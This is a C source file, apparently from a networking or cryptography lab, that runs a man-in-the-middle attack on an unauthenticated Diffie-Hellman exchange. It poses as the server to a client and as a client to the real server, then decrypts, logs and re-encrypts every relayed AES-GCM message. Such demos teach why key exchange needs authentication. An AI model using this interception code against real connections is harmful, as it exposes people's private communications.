#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>

#include "../common/dh.h"
#include "../common/crypto.h"

#define LISTEN_PORT 5001

#define SERVER_IP "10.129.27.74"
#define SERVER_PORT 5000

#define BUFFER_SIZE 4096


/*
 * Encrypt a plaintext message using the supplied AES key
 * and send it using the same ENC packet format as the client.
 */
int send_encrypted_message(
    int sockfd,
    const unsigned char *key,
    const char *message
)
{
    unsigned char nonce[GCM_NONCE_SIZE];
    unsigned char ciphertext[BUFFER_SIZE];
    unsigned char tag[GCM_TAG_SIZE];

    int plaintext_len = strlen(message);

    int ciphertext_len = aes_gcm_encrypt(
        key,
        (const unsigned char *)message,
        plaintext_len,
        nonce,
        ciphertext,
        tag
    );

    if (ciphertext_len <= 0) {
        printf("[CRYPTO] Encryption failed.\n");
        return -1;
    }

    char nonce_hex[GCM_NONCE_SIZE * 2 + 1];
    char ciphertext_hex[BUFFER_SIZE * 2 + 1];
    char tag_hex[GCM_TAG_SIZE * 2 + 1];

    for (int i = 0; i < GCM_NONCE_SIZE; i++)
        sprintf(&nonce_hex[i * 2], "%02x", nonce[i]);

    for (int i = 0; i < ciphertext_len; i++)
        sprintf(&ciphertext_hex[i * 2], "%02x", ciphertext[i]);

    for (int i = 0; i < GCM_TAG_SIZE; i++)
        sprintf(&tag_hex[i * 2], "%02x", tag[i]);

    nonce_hex[GCM_NONCE_SIZE * 2] = '\0';
    ciphertext_hex[ciphertext_len * 2] = '\0';
    tag_hex[GCM_TAG_SIZE * 2] = '\0';

    char packet[BUFFER_SIZE * 3];

    snprintf(
        packet,
        sizeof(packet),
        "ENC %s %s %s\n",
        nonce_hex,
        ciphertext_hex,
        tag_hex
    );

    return send(
        sockfd,
        packet,
        strlen(packet),
        0
    );
}


/*
 * Decrypt an ENC packet using the supplied AES key.
 */
int decrypt_message(
    const unsigned char *key,
    char *packet,
    unsigned char *plaintext
)
{
    char *type;
    char *nonce_hex;
    char *ciphertext_hex;
    char *tag_hex;

    unsigned char nonce[GCM_NONCE_SIZE];
    unsigned char ciphertext[BUFFER_SIZE];
    unsigned char tag[GCM_TAG_SIZE];

    type = strtok(packet, " ");
    nonce_hex = strtok(NULL, " ");
    ciphertext_hex = strtok(NULL, " ");
    tag_hex = strtok(NULL, " \n");

    if (type == NULL ||
        nonce_hex == NULL ||
        ciphertext_hex == NULL ||
        tag_hex == NULL ||
        strcmp(type, "ENC") != 0) {

        printf("[CRYPTO] Invalid encrypted packet.\n");
        return 0;
    }

    for (int i = 0; i < GCM_NONCE_SIZE; i++) {
        sscanf(
            &nonce_hex[i * 2],
            "%2hhx",
            &nonce[i]
        );
    }

    int ciphertext_len = strlen(ciphertext_hex) / 2;

    for (int i = 0; i < ciphertext_len; i++) {
        sscanf(
            &ciphertext_hex[i * 2],
            "%2hhx",
            &ciphertext[i]
        );
    }

    for (int i = 0; i < GCM_TAG_SIZE; i++) {
        sscanf(
            &tag_hex[i * 2],
            "%2hhx",
            &tag[i]
        );
    }

    int plaintext_len = aes_gcm_decrypt(
        key,
        nonce,
        ciphertext,
        ciphertext_len,
        tag,
        plaintext
    );

    if (plaintext_len <= 0) {
        printf("[CRYPTO] Authentication failed.\n");
        return 0;
    }

    plaintext[plaintext_len] = '\0';

    return plaintext_len;
}


/*
 * Send a DH public key using the same protocol as the client/server.
 */
int send_dh_public(
    int sockfd,
    const BIGNUM *public_key
)
{
    char *public_hex = BN_bn2hex(public_key);

    if (public_hex == NULL) {
        printf("[DH] Failed to convert public key.\n");
        return 0;
    }

    char message[BUFFER_SIZE];

    snprintf(
        message,
        sizeof(message),
        "DH_PUBLIC %s\n",
        public_hex
    );

    OPENSSL_free(public_hex);

    if (send(
            sockfd,
            message,
            strlen(message),
            0
        ) < 0) {

        perror("[DH] send");
        return 0;
    }

    return 1;
}


/*
 * Receive and parse a DH public key.
 */
int receive_dh_public(
    int sockfd,
    BIGNUM **public_key
)
{
    char buffer[BUFFER_SIZE];

    int bytes_received = recv(
        sockfd,
        buffer,
        sizeof(buffer) - 1,
        0
    );

    if (bytes_received <= 0) {
        perror("[DH] recv");
        return 0;
    }

    buffer[bytes_received] = '\0';

    if (strncmp(buffer, "DH_PUBLIC ", 10) != 0) {
        printf("[DH] Invalid DH message: %s", buffer);
        return 0;
    }

    char *public_hex = buffer + 10;

    public_hex[strcspn(public_hex, "\n")] = '\0';

    if (!BN_hex2bn(public_key, public_hex)) {
        printf("[DH] Failed to parse public key.\n");
        return 0;
    }

    return 1;
}


/*
 * Perform the DH exchange from Mallory's side.
 *
 * Mallory is acting as the "server" to C1.
 *
 * C1:
 *      receives Mallory public key
 *      sends C1 public key
 *
 * Mallory:
 *      sends Mallory public key
 *      receives C1 public key
 */
int perform_dh_as_server(
    int client_fd,
    DHKeyPair *mallory_keypair,
    BIGNUM **shared_secret
)
{
    BIGNUM *client_public_key = NULL;

    /*
     * Generate Mallory's DH key pair.
     */
    if (!dh_generate_keypair(mallory_keypair)) {
        printf("[DH] Failed to generate Mallory key pair.\n");
        return 0;
    }

    /*
     * Send Mallory's public key to C1.
     */
    if (!send_dh_public(
            client_fd,
            mallory_keypair->public_key)) {

        return 0;
    }

    printf("[MITM] Sent Mallory's DH public key to C1.\n");

    /*
     * Receive C1's public key.
     */
    if (!receive_dh_public(
            client_fd,
            &client_public_key)) {

        return 0;
    }

    printf("[MITM] Received C1's DH public key.\n");

    /*
     * Compute K1 = g^(mallory_private * client_private) mod p
     */
    *shared_secret = dh_compute_shared_secret(
        mallory_keypair->private_key,
        client_public_key
    );

    BN_free(client_public_key);

    if (*shared_secret == NULL) {
        printf("[DH] Failed to compute C1-Mallory shared secret.\n");
        return 0;
    }

    send(client_fd, "DH_OK\n", 6, 0);

    printf("[MITM] C1 <-> Mallory DH complete.\n");

    return 1;
}


/*
 * Perform the DH exchange from Mallory's side.
 *
 * Mallory is acting as the "client" to the real server.
 */
int perform_dh_as_client(
    int server_fd,
    DHKeyPair *mallory_keypair,
    BIGNUM **shared_secret
)
{
    BIGNUM *server_public_key = NULL;

    /*
     * Receive real server's public key.
     */
    if (!receive_dh_public(
            server_fd,
            &server_public_key)) {

        return 0;
    }

    printf("[MITM] Received real server's DH public key.\n");

    /*
     * Generate Mallory's second, independent DH key pair.
     */
    if (!dh_generate_keypair(mallory_keypair)) {
        printf("[DH] Failed to generate Mallory key pair.\n");
        BN_free(server_public_key);
        return 0;
    }

    /*
     * Send Mallory's second public key to the real server.
     */
    if (!send_dh_public(
            server_fd,
            mallory_keypair->public_key)) {

        BN_free(server_public_key);
        return 0;
    }

    printf("[MITM] Sent Mallory's DH public key to server.\n");

    /*
     * Compute K2.
     */
    *shared_secret = dh_compute_shared_secret(
        mallory_keypair->private_key,
        server_public_key
    );

    BN_free(server_public_key);

    if (*shared_secret == NULL) {
        printf("[DH] Failed to compute Mallory-server shared secret.\n");
        return 0;
    }

    /*
     * The real server sends DH_OK after receiving
     * Mallory's public key.
     */
    char buffer[BUFFER_SIZE];

    int bytes_received = recv(
        server_fd,
        buffer,
        sizeof(buffer) - 1,
        0
    );

    if (bytes_received <= 0) {
        printf("[DH] Server closed connection.\n");
        return 0;
    }

    buffer[bytes_received] = '\0';

    if (strcmp(buffer, "DH_OK\n") != 0) {
        printf("[DH] Unexpected server response: %s", buffer);
        return 0;
    }

    printf("[MITM] Mallory <-> Server DH complete.\n");

    return 1;
}


int main()
{
    int listen_fd;
    int client_fd;
    int server_fd;

    struct sockaddr_in mallory_addr;
    struct sockaddr_in client_addr;
    struct sockaddr_in server_addr;

    socklen_t client_len = sizeof(client_addr);

    DHKeyPair client_side_keypair;
    DHKeyPair server_side_keypair;

    BIGNUM *client_shared_secret = NULL;
    BIGNUM *server_shared_secret = NULL;

    unsigned char client_key[32];
    unsigned char server_key[32];

    /*
     * Initialize keypair pointers.
     */
    client_side_keypair.private_key = NULL;
    client_side_keypair.public_key = NULL;

    server_side_keypair.private_key = NULL;
    server_side_keypair.public_key = NULL;


    /*
     * =========================================================
     * 1. Listen for C1
     * =========================================================
     */

    listen_fd = socket(
        AF_INET,
        SOCK_STREAM,
        0
    );

    if (listen_fd < 0) {
        perror("socket");
        return 1;
    }

    memset(
        &mallory_addr,
        0,
        sizeof(mallory_addr)
    );

    mallory_addr.sin_family = AF_INET;
    mallory_addr.sin_port = htons(LISTEN_PORT);
    mallory_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(
            listen_fd,
            (struct sockaddr *)&mallory_addr,
            sizeof(mallory_addr)
        ) < 0) {

        perror("bind");
        close(listen_fd);
        return 1;
    }

    if (listen(listen_fd, 1) < 0) {
        perror("listen");
        close(listen_fd);
        return 1;
    }

    printf(
        "[MITM] Listening on port %d...\n",
        LISTEN_PORT
    );


    /*
     * =========================================================
     * 2. Accept C1
     * =========================================================
     */

    client_fd = accept(
        listen_fd,
        (struct sockaddr *)&client_addr,
        &client_len
    );

    if (client_fd < 0) {
        perror("accept");
        close(listen_fd);
        return 1;
    }

    printf("[MITM] C1 connected.\n");


    /*
     * =========================================================
     * 3. Establish K1: C1 <-> Mallory
     * =========================================================
     */

    if (!perform_dh_as_server(
            client_fd,
            &client_side_keypair,
            &client_shared_secret)) {

        printf("[MITM] Client-side DH failed.\n");

        close(client_fd);
        close(listen_fd);
        return 1;
    }

    if (!dh_derive_key(
            client_shared_secret,
            client_key)) {

        printf("[MITM] Failed to derive client-side AES key.\n");

        close(client_fd);
        close(listen_fd);
        return 1;
    }

    printf("[MITM] AES key K1 established.\n");


    /*
     * =========================================================
     * 4. Connect to real Server
     * =========================================================
     */

    server_fd = socket(
        AF_INET,
        SOCK_STREAM,
        0
    );

    if (server_fd < 0) {
        perror("socket");
        close(client_fd);
        close(listen_fd);
        return 1;
    }

    memset(
        &server_addr,
        0,
        sizeof(server_addr)
    );

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    if (inet_pton(
            AF_INET,
            SERVER_IP,
            &server_addr.sin_addr
        ) <= 0) {

        perror("inet_pton");

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }

    if (connect(
            server_fd,
            (struct sockaddr *)&server_addr,
            sizeof(server_addr)
        ) < 0) {

        perror("connect");

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }

    printf(
        "[MITM] Connected to real server %s:%d.\n",
        SERVER_IP,
        SERVER_PORT
    );


    /*
     * =========================================================
     * 5. Establish K2: Mallory <-> Server
     * =========================================================
     */

    if (!perform_dh_as_client(
            server_fd,
            &server_side_keypair,
            &server_shared_secret)) {

        printf("[MITM] Server-side DH failed.\n");

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }

    if (!dh_derive_key(
            server_shared_secret,
            server_key)) {

        printf("[MITM] Failed to derive server-side AES key.\n");

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }

    printf("[MITM] AES key K2 established.\n");

    printf("\n");
    printf("[MITM] =====================================\n");
    printf("[MITM] MITM channels established.\n");
    printf("[MITM] K1 = C1 <-> Mallory\n");
    printf("[MITM] K2 = Mallory <-> Server\n");
    printf("[MITM] =====================================\n");
    printf("\n");


    /*
     * =========================================================
     * 6. Relay traffic
     * =========================================================
     */

    while (1) {

        fd_set readfds;

        FD_ZERO(&readfds);

        FD_SET(client_fd, &readfds);
        FD_SET(server_fd, &readfds);

        int max_fd = client_fd;

        if (server_fd > max_fd)
            max_fd = server_fd;

        int activity = select(
            max_fd + 1,
            &readfds,
            NULL,
            NULL,
            NULL
        );

        if (activity < 0) {
            perror("select");
            break;
        }


        /*
         * =====================================================
         * C1 -> Mallory -> Server
         * =====================================================
         */

        if (FD_ISSET(client_fd, &readfds)) {

            char packet[BUFFER_SIZE];
            char plaintext[BUFFER_SIZE];

            int bytes_received = recv(
                client_fd,
                packet,
                sizeof(packet) - 1,
                0
            );

            if (bytes_received <= 0) {
                printf("[MITM] C1 disconnected.\n");
                break;
            }

            packet[bytes_received] = '\0';

            int plaintext_len = decrypt_message(
                client_key,
                packet,
                (unsigned char *)plaintext
            );

            if (plaintext_len <= 0) {
                printf("[MITM] Failed to decrypt C1 message.\n");
                continue;
            }

            plaintext[plaintext_len] = '\0';

            printf(
                "[MITM] C1 -> Server: %s",
                plaintext
            );

            if (plaintext[plaintext_len - 1] != '\n')
                printf("\n");

            /*
             * Re-encrypt plaintext using K2.
             */
            if (send_encrypted_message(
                    server_fd,
                    server_key,
                    plaintext
                ) < 0) {

                perror("[MITM] Forward to server");
                break;
            }
        }


        /*
         * =====================================================
         * Server -> Mallory -> C1
         * =====================================================
         */

        if (FD_ISSET(server_fd, &readfds)) {

            char packet[BUFFER_SIZE];
            char plaintext[BUFFER_SIZE];

            int bytes_received = recv(
                server_fd,
                packet,
                sizeof(packet) - 1,
                0
            );

            if (bytes_received <= 0) {
                printf("[MITM] Server disconnected.\n");
                break;
            }

            packet[bytes_received] = '\0';

            int plaintext_len = decrypt_message(
                server_key,
                packet,
                (unsigned char *)plaintext
            );

            if (plaintext_len <= 0) {
                printf("[MITM] Failed to decrypt server message.\n");
                continue;
            }

            plaintext[plaintext_len] = '\0';

            printf(
                "[MITM] Server -> C1: %s",
                plaintext
            );

            if (plaintext[plaintext_len - 1] != '\n')
                printf("\n");

            /*
             * Re-encrypt plaintext using K1.
             */
            if (send_encrypted_message(
                    client_fd,
                    client_key,
                    plaintext
                ) < 0) {

                perror("[MITM] Forward to client");
                break;
            }
        }
    }


    /*
     * =========================================================
     * Cleanup
     * =========================================================
     */

    BN_free(client_shared_secret);
    BN_free(server_shared_secret);

    dh_free_keypair(&client_side_keypair);
    dh_free_keypair(&server_side_keypair);

    close(server_fd);
    close(client_fd);
    close(listen_fd);

    return 0;
}
